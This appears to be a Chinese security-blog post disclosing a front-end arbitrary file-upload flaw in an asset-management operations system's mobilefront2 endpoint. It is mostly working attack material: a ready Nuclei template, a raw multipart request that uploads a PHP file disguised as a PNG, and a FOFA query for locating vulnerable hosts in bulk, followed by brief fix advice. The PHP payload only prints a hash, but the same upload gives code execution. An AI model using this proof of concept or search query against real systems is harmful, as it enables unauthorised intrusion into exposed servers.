#  资产管理运营系统mobilefront2接口处存在前台文件上传漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-29 00:30  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
资产管理运营系统mobilefront2接口处存在前台文件上传漏洞。  
攻击者可通过上传包含恶意代码的文件到服务器，使恶意文件被执行，从而导致系统被入侵或遭受其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: zichanguanliyunyingxitong-mobilefront2-fileupload

info:
  name: 资产管理运营系统mobilefront2接口处存在前台文件上传漏洞

  author: kingkong
  severity: high
  metadata:
    fofa-query: body="media/css/uniform.default.css" && body="资管云"

http:
  - raw:
      - |
        POST /mobilefront/c/2.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        Content-Length: 35827

        -----------------------------289666258334735365651210512949
        Content-Disposition: form-data; name="file1"; filename="1.php"
        Content-Type: image/png

        <?php echo md5(123456);@unlink(__FILE__);?>
        -----------------------------289666258334735365651210512949--

      - |
        GET /mobilefront/c/images2/{{fileUrl}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_2,"e10adc3949ba59abbe56e057f20f883e")'
        condition: and

    extractors:
      - type: regex
        name: fileUrl
        part: body_1
        group: 1
        regex:
          - ([0-9]{11}.php)
        internal: true
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="media/css/uniform.default.css" && body="资管云"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncjmkluNgEh2MgDZNibu6s8iaAXV9evhPq2Ar2SGmXsekIhFfGC8hiacuvtiaIeluCorqAn24t3XDpiagw/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncjmkluNgEh2MgDZNibu6s8iadk2depYBMhyEfPqSO0jsicxILfcDhAZ3PmdPAvDiccQaPicOSLlejOUdA/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncjmkluNgEh2MgDZNibu6s8iaZzESIWibbZIkBNXmtUbE5OfnBiatiazDcFYyH6sImzODAGLTlsEYibWYWA/640?wx_fmt=png&from=appmsg "")  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncjmkluNgEh2MgDZNibu6s8iajiaib1Lwia0PxkOnWXNo8KDBC84RnunX5FvoS85JUtunNhEawbFlQMbNg/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /mobilefront/c/2.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Connection: close
Content-Length: 260
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
X-Requested-With: XMLHttpRequest

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="1.php"
Content-Type: image/png

<?php echo md5(123456);@unlink(__FILE__);?>
-----------------------------289666258334735365651210512949--

GET /mobilefront/c/images2/17327589271.php HTTP/1.1
Host:

```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncjmkluNgEh2MgDZNibu6s8iaJXYicOTXmG5SbFY2LXhr9oanAUDZAeMuffYBrQ9R49rCicE6bAgUwepQ/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、文件类型验证：仅允许上传特定类型的文件，例如图像、文档等，并拒绝可执行文件或其他潜在的恶意文件类型。  
  
2、文件大小限制：限制上传文件的大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。  
  
3、文件名处理：对上传的文件进行重命名，避免使用用户提供的文件名，以防止路径遍历攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
  
